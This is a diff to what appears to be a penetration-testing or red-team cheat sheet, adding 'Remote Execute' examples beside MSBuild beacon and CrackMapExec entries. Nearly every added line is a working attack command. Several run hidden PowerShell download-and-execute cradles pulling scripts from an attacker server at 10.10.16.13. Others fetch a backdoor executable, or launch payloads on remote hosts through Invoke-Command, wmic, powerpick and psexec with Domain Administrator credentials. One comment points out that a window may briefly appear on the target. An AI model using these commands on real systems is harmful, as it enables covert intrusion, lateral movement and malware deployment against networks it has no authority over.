@@ -132,6 +132,17 @@ MSBuild Beacon
     Execute %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe c:\windows\temp\msbuild_nps.xml
 
 Remote Execute
+  Examples:
+      powershell.exe -nop -w hidden -c iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')
+      Invoke-WebRequest "http://10.10.16.13/bd" -OutFile "C:\users\public\downloads\bd.exe"
+      Invoke-Command -computername HOSTNAME -scriptblock {"C:\users\public\downloads\bd.exe" -AsJob}
+      powerpick invoke-command -computername corewkt002.core.cyber.local -scriptblock {iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')}
+      powershell iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')
+      shell wmic /node:10.9.15.200 process call create "powershell.exe -nop -w hidden iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')"
+        * PS windows may popup for a second on target
+      psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -InputFormat None -nop -w hidden -c "iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')"
+      psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Users\user\desktop\beacon.exe"
+  
   CrackMapExec
     crackmapexec IP_Address -u username -p='password' (Test if you have access)
     crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
